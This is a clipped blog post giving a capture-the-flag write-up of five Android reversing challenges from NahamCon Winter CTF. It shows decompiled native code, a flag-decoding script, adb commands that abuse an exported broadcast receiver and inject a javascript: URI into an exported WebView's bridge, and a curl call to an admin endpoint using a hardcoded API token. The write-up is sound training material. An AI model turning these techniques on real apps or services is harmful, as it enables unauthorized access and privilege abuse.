---
title: "NahamCon Winter CTF ::"
source: https://0xbinder.github.io/posts/nahamcon-winter-ctf/
source_host: 0xbinder.github.io
clip_date: 2026-10-16T10:20:10+08:00
trace_id: cac0a7ef-34a7-45d3-b1b0-ae0f832b5cb8
content_hash: f35bcc0ce5420255c3a1e64512e3304dd69202e6219b36ffaf9a1a6f90b3bfa2
status: synced
tags:
  - Android逆向
  - CTF
series: null
feed_source: 0xbinder·Android内核/利用
ai_summary: APK 逆向 + 组件滥用 + 硬编码凭据三条主线，五个 Android 题全部拿下 flag。
ai_summary_style: key-points
images_status:
  total: 9
  succeeded: 9
  failed_urls: []
notion_page_id: 3fb75244-d011-8146-b47a-e2ec0764c5d8
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> APK 逆向 + 组件滥用 + 硬编码凭据三条主线，五个 Android 题全部拿下 flag。
> 
> - **Bug Bounty Hub：** 逆 `libnativecore.so` 的 `decodeToken`：按索引奇偶用 `0x7E/0x3F` 异或、减 `index*5`、按 `i%3+1` 循环右移、再异或 `0x42`；`.bss` 中 28 字节数据由构造器小端写入，需先反转字节序。
> - **EBANK：** flag 由 5 段拼接——资源字符串反转后 hex 解码得 `flag{`；包名 `com.sehno.ebank` ASCII 和 1465 取模 256 作单字节异或密钥；资源 Base64 解码；native 层 `.rodata` 数据逐字节异或 `0x7a`；末段对字节按位取反。
> - **Magic Snowfall：** 导出 `SnowRewardReceiver` 只校验固定 `secret_key=winter2025`，用 `am broadcast -n` 指定组件并传 `bonus_tier=aurora_vip` 即可伪造 VIP 身份触发 native 解密。
> - **Frozen Gift：** 导出 `DebugGiftWebViewActivity` 直接 `loadUrl` 外部 `debugUrl`，注入 `javascript:SnowGiftBridge.unlockPremiumGift("frost_king")` 调用 JS 桥解锁高级礼包。
> - **Dojo Help Center：** `Constants.java` 硬编码 `API_TOKEN` 与 `APP_ID`，携带 `Authorization: Bearer` 与 `X-App-ID` 请求 `/api/admin/internal` 直接返回 flag，属 CVSS 9.1 硬编码凭据漏洞。

![alt text](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d77fce382eeb3b89.png)

## Mobile

Challenges? Too easy… I’ve awakened.

![yay](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4e903b83463c4487.gif)

## Bug Bounty Hub

![alt text](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/89fc9e47e3d7a23d.png)

Reversing the apk file we notice an interesting native binary `libnativecore.so`. We fireup ghidra and notice these two interesting functions

![alt text](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8fe447f40e48d9ff.png)

The `decodeToken` function performs a complex set of bitwise operations on a global data buffer `(DAT_0015f4f0)`.

-   Data Loading: It loads data from `DAT_0015f4f0`.
-   Reverse Loop: The loop `while (local_34 ... -1)` suggests it processes or copies the data in reverse order.
-   Decryption Logic: It iterates through the data applying:
    -   XOR: Different keys `(0x7E or 0x3F)` depending on if the index is even or odd.
    -   Arithmetic: Subtracting `(index * 5)`.
    -   Bitwise Rotation: The line `(local_51 >> ... | local_51 << ...)` is a standard Right Rotate (ROR) operation.
    -   Final XOR: XORing the result with `0x42`.

```c
/* WARNING: Removing unreachable block (ram,0x00126653) */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */
/* decodeToken() */

undefined8 decodeToken(void){
  undefined8 uVar1;
  ulong uVar2;
  byte *pbVar3;
  undefined8 in_RDI;
  long in_FS_OFFSET;
  byte local_58;
  byte local_51;
  ulong local_50;
  int local_34;
  undefined1 local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_001266c0(local_28);
  local_34 = FUN_00126740(&DAT_0015f4f0);
  while (local_34 = local_34 + -1, -1 < local_34) {
    uVar1 = FUN_001267e0(&DAT_0015f4f0,(long)local_34);
                    /* try { // try from 00126500 to 00126508 has its CatchHandler @ 00126521 */
    FUN_00126760(local_28,uVar1);
  }
  FUN_00126800(in_RDI);
  for (local_50 = 0; uVar2 = FUN_00126740(local_28), local_50 < uVar2; local_50 = local_50 + 1) {
    pbVar3 = (byte *)FUN_00126870(local_28,local_50);
    if ((local_50 & 1) == 0) {
      local_51 = *pbVar3 ^ 0x7e;
    }
    else {
      local_51 = *pbVar3 ^ 0x3f;
    }
    local_51 = local_51 + (char)local_50 * -5;
    local_58 = (char)local_50 + (char)(local_50 / 3) * -3 + 1;
                    /* try { // try from 0012660b to 0012660f has its CatchHandler @ 0012662b */
    FUN_00126890(in_RDI,(int)(char)((local_51 >> (local_58 & 0x1f) |
                                    local_51 << (8 - local_58 & 0x1f)) ^ 0x42));
  }
  FUN_00126440(local_28);
  if (*(long *)(in_FS_OFFSET + 0x28) != local_10) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return in_RDI;
}
```

The variable `DAT_0015f4f0` is in the `.bss` section (uninitialized), meaning it is populated at runtime. We followed the Cross-Reference (XREF) to `FUN_00126230`, which initializes this data.

```c
void FUN_00126230(void) {
  long in_FS_OFFSET;
  undefined4 local_38;
  undefined4 uStack_34;
  undefined4 uStack_30;
  undefined8 local_2c;
  undefined8 uStack_24;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  uStack_24 = 0x36825d66862600cf;
  local_38 = 0xa635cd3a;
  uStack_34 = 0x919cbc39;
  uStack_30 = 0x57393e10;
  local_2c = 0x27488920d635505c;
  FUN_001262d0(&DAT_0015f4f0,&local_38,0x1c);
  __cxa_atexit(FUN_00126440,&DAT_0015f4f0,&PTR_LOOP_0015a310);
  if (*(long *)(in_FS_OFFSET + 0x28) == local_10) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

We must reverse the byte order of the hex values to get the actual array used by the encryption function.

`local_38 = 0xa635cd3a = 3A CD 35 A6`

`uStack_34 = 0x919cbc39 = 39 BC 9C 91`

`uStack_30 = 0x57393e10 = 10 3E 39 57`

`local_2c = 0x27488920d635505c = 5C 50 35 D6 20 89 48 27`

`uStack_24 = 0x36825d66862600cf = CF 00 26 86 66 5D 82 36`

Extracted Byte Array:

`3A CD 35 A6 39 BC 9C 91 10 3E 39 57 5C 50 35 D6 20 89 48 27 CF 00 26 86 66 5D 82 36`

We wrote a Python script to replicate the reverse-logic of `decodeToken`.

```python
def get_flag():
    encrypted_bytes = [
        0x3A, 0xCD, 0x35, 0xA6, 
        0x39, 0xBC, 0x9C, 0x91, 
        0x10, 0x3E, 0x39, 0x57, 
        0x5C, 0x50, 0x35, 0xD6, 
        0x20, 0x89, 0x48, 0x27, 
        0xCF, 0x00, 0x26, 0x86, 
        0x66, 0x5D, 0x82, 0x36
    ]

    processing_data = encrypted_bytes[::-1]
    flag = ""
    for i, b in enumerate(processing_data):
        if (i % 2) != 0: 
            val = b ^ 0x3F
        else:        
            val = b ^ 0x7E
        val = (val - (i * 5)) & 0xFF
        shift = (i % 3) + 1
        val = ((val >> shift) | (val << (8 - shift))) & 0xFF
        final_char = val ^ 0x42
        flag += chr(final_char)
    return flag

print(get_flag())
```

Running the script reveals the flag:

```bash
python3 exploit.py
flag{Br1dg3_t0_N4t1v3_W0r!d}
```

## EBANK

Decompiling the APK, we locate the main logic in `com.sehno.ebank.PremiumActivity`. The code reveals that the flag is split into 5 separate parts, concatenated together in the `generateFlag()` function:

```java
private final String generateFlag() {
    try {
        String part1 = getPart1();
        String part2 = getPart2();
        String part3 = getPart3();
        String part4 = getPart4();
        String part5 = getPart5();
        return part1 + part2 + part3 + part4 + part5;
    } catch (Exception e) {
        return this.FAKE_FLAG_1;
    }
}
```

`getPart1()` reads a string resource named `error_code_404`.

Value: `b77616c666 (from strings.xml)`

The function `decodeHexReversed` does two things:

Reverses the string: `b77616c666 = 666c61677b`

Decodes hex to ASCII:

`0x66 = f`

`0x6c = l`

`0x61 = a`

`0x67 = g`

`0x7b = {`

Result: `flag{`

```java
private final String getPart1() {
    String hexReversed = getString(R.string.error_code_404);
    Intrinsics.checkNotNullExpressionValue(hexReversed, "getString(...)");
    return decodeHexReversed(hexReversed);
}

private final String decodeHexReversed(String hexString) {
    String reversed = StringsKt.reversed((CharSequence) hexString).toString();
    Iterable $this$map$iv = StringsKt.chunked(reversed, 2);
    Collection destination$iv$iv = new ArrayList(CollectionsKt.collectionSizeOrDefault($this$map$iv, 10));
    for (Object item$iv$iv : $this$map$iv) {
        String it = (String) item$iv$iv;
        destination$iv$iv.add(Byte.valueOf((byte) Integer.parseInt(it, CharsKt.checkRadix(16))));
    }
    byte[] bytes = CollectionsKt.toByteArray((List) destination$iv$iv);
    return new String(bytes, Charsets.UTF_8);
}
```

`getPart2()` uses a byte array: `{-16, -41, -51, -118, -41, -51}`. The code derives a single-byte XOR key based on the package name `com.sehno.ebank`. Key Calculation: Sum of all ASCII characters in the package name modulo 256.

`Sum("com.sehno.ebank") = 1465`

`1465(mod256)=1851465(mod256)=185`

In Java (signed bytes), `185` wraps around to `-71`.

Decryption: XOR the data with the key `-71`.

Encrypted Byte Key XOR Calculation ASCII Char

`-16 -71 -16 ^ -71 = 73 I`

`-41 -71 -41 ^ -71 = 110 n`

`-51 -71 -51 ^ -71 = 116 t`

`-118 -71 -118 ^ -71 = 51 3`

`-41 -71 -41 ^ -71 = 110 n`

`-51 -71 -51 ^ -71 = 116 t`

Result: `Int3nt`

```java
private final String getPart2() {
    byte[] obfuscated = {-16, -41, -51, -118, -41, -51};
    byte key = deriveKey();
    return xorDecode(obfuscated, key);
}

private final byte deriveKey() {
    String packageName = getPackageName();
    Intrinsics.checkNotNullExpressionValue(packageName, "getPackageName(...)");
    String str = packageName;
    int i = 0;
    for (int i2 = 0; i2 < str.length(); i2++) {
        char it = str.charAt(i2);
        i += it;
    }
    return (byte) (i % 256);
}

private final String xorDecode(byte[] data, byte key) {
    Collection destination$iv$iv = new ArrayList(data.length);
    for (byte item$iv$iv : data) {
        byte it = (byte) (item$iv$iv ^ key);
        destination$iv$iv.add(Byte.valueOf(it));
    }
    return new String(CollectionsKt.toByteArray((List) destination$iv$iv), Charsets.UTF_8);
}
```

`getPart3()` reads a string resource named `api_timeout_value`. Value: `X1JlZCFy`

`Base64.decode("X1JlZCFy") = _Red!r`

Result: `_Red!r`

```java
private final String getPart3() {
    String encoded = getString(R.string.api_timeout_value);
    Intrinsics.checkNotNullExpressionValue(encoded, "getString(...)");
    return decodeCustomBase64(encoded);
}

private final String decodeCustomBase64(String encoded) {
    byte[] decoded = Base64.decode(encoded, 0);
    Intrinsics.checkNotNull(decoded);
    return new String(decoded, Charsets.UTF_8);
}
```

`getPart4()` calls a native library

```java
private final String getPart4() {
    if (!NativeLib.INSTANCE.isNativeLibraryAvailable()) {
        return "";
    }
    try {
        return NativeLib.INSTANCE.getFlagPart();
    } catch (Exception e) {
        return "";
    }
}
```

We switch to Ghidra to analyze `libnative-lib.so`. The function `Java_com_sehno_ebank_NativeLib_getFlagPart` calls an internal function `deobfuscate`. The `deobfuscate` function iterates over a byte array found at `DAT_00113400` in the `.rodata` section and XORs every byte with `0x7a`.

```c
void deobfuscate(void) {
  undefined8 in_x8;
  int local_20;
  
  FUN_0011dd24();
  for (local_20 = 0; (&DAT_00113400)[local_20] != '\0'; local_20 = local_20 + 1) {
                    /* try { // try from 0011dcb0 to 0011dcb3 has its CatchHandler @ 0011dccc */
    FUN_0011dd90(in_x8,(&DAT_00113400)[local_20] ^ 0x7a);
  }
  return;
}
```

Raw Data: `1f 19 0e 33 4a 14 25 0a 2d 00`

```c
                        //
                        // .rodata 
                        // SHT_PROGBITS  [0x13400 - 0x16a5b]
                        // ram:00113400-ram:00116a5b
                        //
                        DAT_00113400                                    XREF[3]:     deobfuscate:0011dc88(*), 
                                                                                    deobfuscate:0011dca4(*), 
                                                                                    _elfSectionHeaders::000002d0(*)  
00113400 1f              ??         1Fh
00113401 19              ??         19h
00113402 0e              ??         0Eh
00113403 33              ??         33h    3
00113404 4a              ??         4Ah    J
00113405 14              ??         14h
00113406 25              ??         25h    %
00113407 0a              ??         0Ah
00113408 2d              ??         2Dh    -
00113409 00              ??         00h
```

`0x1f ^ 0x7a = 0x65 (e)`

`0x19 ^ 0x7a = 0x63 (c)`

`0x0e ^ 0x7a = 0x74 (t)`

`0x33 ^ 0x7a = 0x49 (I)`

`0x4a ^ 0x7a = 0x30 (0)`

`0x14 ^ 0x7a = 0x6e (n)`

`0x25 ^ 0x7a = 0x5f (_)`

`0x0a ^ 0x7a = 0x70 (p)`

`0x2d ^ 0x7a = 0x57 (W)`

Result: `ectI0n_pW`

`getPart5()` uses a byte array: `{-79, -102, -101, -126}`. The function deobfuscateBitwise applies a Bitwise NOT (~) operation to each byte.

`~(-79) = 78 = N`

`~(-102) = 101 = e`

`~(-101) = 100 = d`

`~(-126) = 125 = }`

```java
private final String getPart5() {
    byte[] obfuscated = {-79, -102, -101, -126};
    return deobfuscateBitwise(obfuscated);
}

private final String deobfuscateBitwise(byte[] data) {
    Collection destination$iv$iv = new ArrayList(data.length);
    for (byte item$iv$iv : data) {
        destination$iv$iv.add(Character.valueOf((char) ((~item$iv$iv) & 255)));
    }
    return new String(CollectionsKt.toCharArray((List) destination$iv$iv));
}
```

Result: `Ned}`

Final flag `flag{Int3nt_Red!rectI0n_pWNed}`

## MAGIC SNOWFALL

Decompiling the apk we notice a single activity and an exported broadcast receiver which looks interesting.

```xml
<activity
    android:name="com.sehno.magicsnowfall.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<receiver
    android:name="com.sehno.magicsnowfall.SnowRewardReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="com.krypton.winterbank.ACTION_SNOWFALL_REWARD"/>
    </intent-filter>
</receiver>
```

We start by examining the main UI logic. The `refreshStatus()` method determines what is displayed on the screen.

```java
private final void refreshStatus() {
    // ... code getting points and tier ...
    boolean isPremium = snowRewardManager3.isPremiumTier();
    
    // ... updating UI text ...
    
    if (isPremium) {
        // CALLS NATIVE FUNCTION
        String flag = FlagProvider.INSTANCE.getFlag(tier);
        if (flag.length() > 0) {
            // Success! Displays the flag
            textView.setText("🎿 AURORA VIP EXCLUSIVE 🎿\n\n" + flag + "\n\nCongratulations!");
            return;
        }
        // ...
    }
}
```

We do not need to reverse the native C code `FlagProvider` manually. If we can trick the app into thinking we are in the “Premium Tier,” the app will call the native function and decrypt the flag for us.

Checking `formatTierName`, we see the mapped name for the premium tier:

```java
case 1296079550:
    if (tier.equals(SnowRewardManager.PREMIUM_TIER)) {
        return "🌟 Aurora VIP";
    }
    break;
```

We find an exported `BroadcastReceiver` that listens for external events.

```java
public final class SnowRewardReceiver extends BroadcastReceiver {
    public static final String ACTION_SNOWFALL_REWARD = "com.krypton.winterbank.ACTION_SNOWFALL_REWARD";
    private static final String WEAK_SECRET = "winter2025";

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        // 1. Validation Check
        String secretKey = intent.getStringExtra("secret_key");
        if (secretKey != null && !Intrinsics.areEqual(secretKey, WEAK_SECRET)) {
             // Log error and return
             return;
        }

        // 2. Set Points
        int bonusPoints = intent.getIntExtra("bonus_points", 0);
        // ...

        // 3. Set Tier
        String bonusTier = intent.getStringExtra("bonus_tier");
        if (bonusTier != null) {
            rewardManager.setTier(bonusTier); // VULNERABILITY FOUND
        }
    }
}
```

The receiver allows any external application (or the ADB shell) to set the user’s tier, provided they pass a simple string check `secret_key` must be `"winter2025"`.

We need to send an Android Broadcast Intent with the following parameters:

-   Action: `com.krypton.winterbank.ACTION_SNOWFALL_REWARD`
    
-   String Extra: `secret_key = "winter2025"`
    
-   String Extra: `bonus_tier = "aurora_vip"`.
    

```java
public static final String PREMIUM_TIER = "aurora_vip";
```

Since Android 8.0 (Oreo), apps running in the background cannot receive implicit broadcasts (broadcasts sent to “everyone”). We must target the specific app component.

```bash
adb shell am broadcast -n com.sehno.magicsnowfall/.SnowRewardReceiver -a com.krypton.winterbank.ACTION_SNOWFALL_REWARD --es secret_key "winter2025" --es bonus_tier "aurora_vip"
```

We run the exploit open and click to refresh. Boom there we go

![alt text](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3ec1bf78c71b8476.png)

## FROZEN GIFT

Decompiling the apk we notice an interesting activity which is exported `com.sehno.frozengift.DebugGiftWebViewActivity`

```xml
<activity
    android:name="com.sehno.frozengift.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:label="Gift Shop"
    android:name="com.sehno.frozengift.GiftShopActivity"
    android:exported="false"/>
<activity
    android:label="Gift Status"
    android:name="com.sehno.frozengift.GiftStatusActivity"
    android:exported="false"/>
<activity
    android:label="Debug Gift Viewer"
    android:name="com.sehno.frozengift.DebugGiftWebViewActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="com.sehno.frozengift.DEBUG_WEBVIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

The WebView adds a JavaScript bridge named `SnowGiftBridge`

```java
webView.addJavascriptInterface(new SnowGiftBridge(), "SnowGiftBridge");
```

The WebView loads a URL provided via a string extra named `debugUrl`.

```java
String debugUrl = getIntent().getStringExtra("debugUrl");
webView.loadUrl(debugUrl);
```

Looking at the `SnowGiftBridge` class, we found a method `unlockPremiumGift(String couponCode)`. It compares the input code against `GiftTierManager.TIER_PREMIUM`.

```java
public final void unlockPremiumGift(String couponCode) {
    if (Intrinsics.areEqual(couponCode, GiftTierManager.TIER_PREMIUM)) {
        // Unlocks the tier
    }
}
```

Checking `GiftTierManager.java`, we found the hardcoded secret value:

```java
public static final String TIER_PREMIUM = "frost_king";
```

we now adb to launch the exported activity and injected a `javascript:` URI as the `debugUrl` extra. This executed the unlock function directly in the WebView context.

```bash
adb shell "am start -n com.sehno.frozengift/.DebugGiftWebViewActivity --es debugUrl 'javascript:SnowGiftBridge.unlockPremiumGift(\"frost_king\")'"
Starting: Intent { cmp=com.sehno.frozengift/.DebugGiftWebViewActivity (has extras) }
```

After executing the exploit, we received a Toast message confirming the premium unlock. We navigated to the Gift Status activity. The app passed the unlocked tier string to the native library (lib.so), which decrypted and displayed the flag.

`flag{fR0zen_Js_br1dGe_Abu$e}`

![alt text](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f878cb2c39b0fd2f.png)

## DOJO HELP CENTER

Decompiling the apk we notice some sensitive data hardcoded in `Constants`.

```java
package com.example.helpcenter_yeswehack;

/* loaded from: classes3.dex */
public class Constants {
    public static final String API_TOKEN = "ZedrlHPRBlgpmEVwB601owCiMEcIaYtn";
    public static final String APP_ID = "ywh_helper_2025";
    public static final String BASE_URL = "https://fakeapi.dojo-yeswehack.com/";
    public static final String COLLECTION_INTERNAL = "67890";
    public static final String COLLECTION_PUBLIC = "12345";
    public static final String ENDPOINT_ARTICLES = "help_center/articles";
    public static final String ENDPOINT_COLLECTIONS = "help_center/collections";
}
```

one of the values is an `API_TOKEN`. We launch the hub and use the provided url which leads us to a swagger. We notice some admin endpoints which require authorization, and since we got a key we proceed to make a request.

![alt text](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fe6cbc3f365b1a6b.png)

we make a request to `https://0mfma0nu14e2.ctfhub.io/api/admin/internal` and boom we get the flag

```bash
curl -H "Authorization: Bearer ZedrlHPRBlgpmEVwB601owCiMEcIaYtn" \
               -H "X-App-ID: ywh_helper_2025" \
               https://0mfma0nu14e2.ctfhub.io/api/admin/internal
{"flag":"flag{3xp0s3d_Cr3ds_G03ssss_BrrRrr}","message":"Well done! Hardcoded credentials in mobile apps are a critical vulnerability. Always remember: when analyzing a mobile application, one of your first steps should be decompiling it to search for hardcoded secrets, API keys, and hidden endpoints. This kind of oversight is more common than you'd think in production apps!","status":"success","tips":["Use tools like jadx, apktool, or MobSF to decompile Android apps","Search for strings like 'api', 'key', 'token', 'secret', 'password'","Check Constants.java, Config files, and resource files","Test all discovered endpoints with the found credentials"],"vulnerability":{"cvss":"9.1","remediation":"Store sensitive credentials in secure backend services or use encrypted keystores","severity":"Critical","type":"Hardcoded API Credentials"}}
```

Me to the Mobile challenges after finding the correct flags:

![yay](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/804b6f39ae773df9.gif)

![alt text](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/54f9fac9d01f6553.png)
